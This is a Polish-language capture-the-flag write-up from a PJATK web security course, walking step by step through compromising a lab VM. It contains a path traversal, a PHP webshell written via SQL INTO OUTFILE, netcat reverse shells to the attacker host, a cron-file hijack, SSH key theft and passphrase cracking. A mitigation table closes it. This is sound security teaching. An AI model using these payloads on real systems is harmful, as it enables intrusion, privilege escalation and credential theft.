# 🛡️ Web Application Security – CTF Lab (PJATK)

> Ćwiczenia z bezpieczeństwa aplikacji webowych przeprowadzone na celowo podatnej maszynie wirtualnej.  
> Cel: zdobycie dwóch flag przez realistyczny łańcuch technik ofensywnych.

---

## 🎯 Cel zadania

Zdobycie dwóch ukrytych flag na maszynie docelowej:
- **Flag 1** → `/home/manager/flag1.txt` — exploitacja aplikacji webowej + eskalacja przez cron
- **Flag 2** → `/root/flag2.txt` — złamanie hasła klucza SSH + logowanie jako root

---

## 🧰 Środowisko

| Element | Szczegóły |
|---|---|
| Maszyna atakująca | Kali Linux — `192.168.86.139` |
| Maszyna docelowa | Debian Linux — `192.168.86.145` |
| Aplikacja | „Best CVEs Database" (PHP + MariaDB) |
| Serwer WWW | Apache 2.4.51 |
| Baza danych | MariaDB 10.5.12 |

---

## 🔗 Łańcuch ataku

```
[1] Rekonesans sieci
        ↓
[2] Path Traversal → odczyt /etc/passwd
        ↓
[3] Info Disclosure → credentials MySQL w database.php
        ↓
[4] SQL INTO OUTFILE → zapis webshella na serwer
        ↓
[5] Reverse Shell → dostęp jako www-data
        ↓
[6] Cron Hijacking → eskalacja do manager
        ↓  🚩 FLAG 1
[7] SSH Key Cracking → złamanie passphrase
        ↓
[8] SSH Root Login → dostęp jako root
        ↓  🚩 FLAG 2
```

---

## 📋 Krok po kroku

---

### Krok 1 – Rekonesans sieci

```bash
nmap -p 80,443 192.168.86.139
sudo arp-scan --localnet
```

**Co robią te komendy:**
- `nmap -p 80,443` — sprawdza czy na danym IP działają porty HTTP/HTTPS
- `arp-scan --localnet` — wysyła zapytania ARP do całej podsieci i zwraca listę aktywnych hostów z adresami MAC; skuteczniejsze niż ping w sieciach lokalnych

**Wynik:** odkryto maszynę docelową pod adresem `192.168.86.145`

![Rekonesans – nmap i arp-scan](screenshots/image1.png)

---

### Krok 2 – Odkrycie aplikacji webowej

Aplikacja „Best CVEs Database" pod adresem `http://192.168.86.145` używa parametru `?cve=` do wczytywania plików.

![Strona główna aplikacji](screenshots/image2.png)

URL wskazuje na podatność — parametr `?cve=` jest przekazywany bezpośrednio do `file_get_contents()`:

![Analiza URL – ?cve=/index.php](screenshots/image3.png)

Widoczny kod źródłowy PHP potwierdza brak sanityzacji:

![Kod źródłowy PHP z podatnością](screenshots/image4.png)

---

### Krok 3 – Path Traversal

```
http://192.168.86.145/?cve=../../../../etc/passwd
```

**Dlaczego to działa:** Sekwencja `../` cofa się o jeden poziom w górę drzewa katalogów. Cztery `../` wyprowadzają z `/var/www/html/` na korzeń `/`, po czym odczytywany jest `/etc/passwd`.

**Wynik:** serwer zwraca zawartość `/etc/passwd` — widoczni użytkownicy systemu: `root`, `manager`, `www-data`

![Path Traversal – odczyt /etc/passwd](screenshots/image6.png)

Odkryto też katalog `/cves/` przez directory listing (Apache bez `Options -Indexes`):

![Directory listing /cves/](screenshots/image5.png)

---

### Krok 4 – Information Disclosure (credentials w kodzie)

```
view-source:http://192.168.86.145/?cve=../database.php
```

**Co robi:** `view-source:` to prefiks przeglądarki wyświetlający surowy kod. Path Traversal + `../database.php` pozwala wyjść z `/cves/` i odczytać plik konfiguracyjny.

**Wynik:** hasło MySQL w plaintext w kodzie źródłowym:

```php
$username = 'manager';
$password = 'pfyicvsareuselesshere';
$database = 'cves';
```

![Credentials MySQL w database.php](screenshots/image7.png)

---

### Krok 5 – Logowanie do bazy danych

```bash
mysql -h 192.168.86.145 -u manager -pfyicvsareuselesshere cves --skip-ssl
```

**Flagi:**
- `-h` — host (adres IP serwera)
- `-u` — nazwa użytkownika
- `-p` — hasło (bez spacji po fladze)
- `--skip-ssl` — pomija weryfikację certyfikatu

![Logowanie do MariaDB](screenshots/image8.png)

---

### Krok 6 – Zapis webshella (SQL INTO OUTFILE)

Szukanie katalogu z prawem zapisu przez mysqld:

```sql
SELECT 'x' INTO OUTFILE '/var/www/MyBestCVEs/cves/test.php';
```

Po kilku próbach z różnymi ścieżkami znaleziono katalog z prawem zapisu:

![Próby zapisu – szukanie writable dir](screenshots/image9.png)

```sql
SELECT 'test' INTO OUTFILE '/var/www/MyBestCVEs/cves/test.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/MyBestCVEs/cves/shell.php';
```

**Dlaczego to działa:** MariaDB z uprawnieniem `FILE` może zapisywać wynik zapytania bezpośrednio do pliku na dysku serwera.

![Udany zapis webshella](screenshots/image11.png)

Weryfikacja przez przeglądarkę — shell.php pojawił się w katalogu:

![Directory listing z shell.php](screenshots/image12.png)

---

### Krok 7 – Reverse Shell jako www-data

Na Kali Linux uruchamiamy nasłuchiwacz:

```bash
nc -lvp 1234
```

**Co robi:** netcat w trybie `-l` (listen) czeka na przychodzące połączenie TCP na porcie `1234`.

Wywołujemy webshell z payloadem reverse shell:

```
http://192.168.86.145/cves/shell.php?cmd=nc+-e+/bin/bash+192.168.86.139+1234
```

Następnie ulepszamy powłokę do interaktywnej:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Dlaczego:** `pty.spawn()` tworzy pseudoterminal — daje normalną powłokę z historią komend i Ctrl+C.

![Reverse shell jako www-data](screenshots/image13.png)

![Shell z uid=33(www-data) po upgrade do pty](screenshots/image14.png)

---

### Krok 8 – Eskalacja uprawnień (Cron Job Hijacking)

```bash
ls -l
cat /etc/crontab
```

**Znaleziony wpis crona:**
```
* * * * * manager php /var/www/MyBestCVEs/stats.php > /home/manager/stats.txt
```

Cron uruchamia `stats.php` co minutę jako `manager`. Plik jest zapisywalny przez `www-data`.

![Zawartość /etc/crontab](screenshots/image15.png)

![Uprawnienia stats.php](screenshots/image16.png)

Otwieramy drugi listener i nadpisujemy plik:

```bash
# Na Kali:
nc -lvp 5555

# W shellu jako www-data:
echo "<?php system('nc -e /bin/bash 192.168.86.139 5555'); ?>" > /var/www/MyBestCVEs/stats.php
```

![Nadpisanie stats.php](screenshots/image17.png)

Po minucie cron odpala stats.php jako manager:

![Połączenie przychodzi jako manager](screenshots/image18.png)

```bash
id
cat flag1.txt
```

![FLAG 1 zdobyta](screenshots/image19.png)

> 🚩 **FLAG 1: `PJATK{g00dj0B}`**

---

### Krok 9 – Kradzież klucza SSH i łamanie hasła

W katalogu domowym managera:

```bash
cat .ssh/id_rsa
```

![Klucz prywatny id_rsa managera](screenshots/image20.png)

Kopiujemy klucz na Kali i zapisujemy:

```bash
nano id_rsa
```

![Zapisanie klucza do pliku](screenshots/image21.png)

Konwertujemy klucz na hash i łamiemy słownikowo:

```bash
ssh2john id_rsa > hash.txt
wget https://github.com/brannondorsey/naive-hashcat/.../rockyou.txt
john --wordlist=rockyou.txt hash.txt
```

**Co robią:**
- `ssh2john` — wyciąga z klucza PEM informacje o szyfrowaniu → tworzy hash dla Johna
- `rockyou.txt` — lista 14 mln haseł z prawdziwego wycieku danych (2009)
- `john --wordlist` — atak słownikowy: sprawdza każde hasło z listy

![Uruchomienie john z rockyou](screenshots/image22.png)

![Wynik: hasło złamane = maximus](screenshots/image23.png)

**Wynik:** hasło złamane w **44 sekundy** → `maximus`

---

### Krok 10 – Root access i Flag 2

```bash
ssh root@127.0.0.1
# passphrase: maximus

ls -la
cat flag2.txt
```

Klucz prywatny managera był wpisany do `/root/.ssh/authorized_keys`.

![SSH jako root + FLAG 2](screenshots/image24.png)

> 🚩 **FLAG 2: `PJATK{h1dd3ninl0c4l}`**

---

## 🛡️ Jak się przed tym chronić?

| Krok | Podatność | Zabezpieczenie |
|---|---|---|
| 2–3 | Path Traversal | `realpath()` + whitelist, `open_basedir` w php.ini |
| 4 | Info Disclosure | Pliki z hasłami poza webroot, zmienne środowiskowe |
| 5–6 | SQL INTO OUTFILE | `REVOKE FILE ON *.*`, `secure_file_priv` w my.cnf |
| 7 | Webshell RCE | `disable_functions = system,exec` w php.ini, WAF |
| 7 | Reverse Shell | Egress filtering — firewall blokujący połączenia wychodzące z serwera |
| 8 | Cron Hijacking | Pliki crona owner: `root`, brak write dla `www-data` |
| 9 | Słabe passphrase | Silne hasło (20+ znaków) lub klucz Ed25519 z `chmod 600` |
| 10 | SSH Root Login | `PermitRootLogin no` w sshd_config, fail2ban, MFA |

---

## 🧠 Czego się nauczyłem

- Łączenia wielu podatności w **spójny łańcuch ataku** (exploit chaining)
- Techniki **Path Traversal** i ich exploitacji w PHP
- Użycia **SQL `SELECT INTO OUTFILE`** jako wektora uploadu webshella
- Stawiania i odbierania **reverse shell** przez netcat
- **Privilege escalation** przez nadpisanie pliku uruchamianego przez cron
- Łamania haseł kluczy SSH (**ssh2john + John the Ripper**)
- Myślenia z perspektywy **Blue Team** — co naprawić po każdym kroku ataku

---

## 🔧 Narzędzia

`nmap` · `arp-scan` · `mysql` · `netcat` · `python3 pty` · `ssh2john` · `john` · `wget`

---

## ⚠️ Disclaimer

Ćwiczenia wykonane wyłącznie na dedykowanej maszynie laboratoryjnej w ramach kursu **Bezpieczeństwo Aplikacji Webowych** na **PJATK**. Wszystkie opisane techniki służą wyłącznie celom edukacyjnym. Stosowanie ich bez zgody właściciela systemu jest nielegalne.

---

*PJATK · Bezpieczeństwo Aplikacji Webowych · 2025/2026*
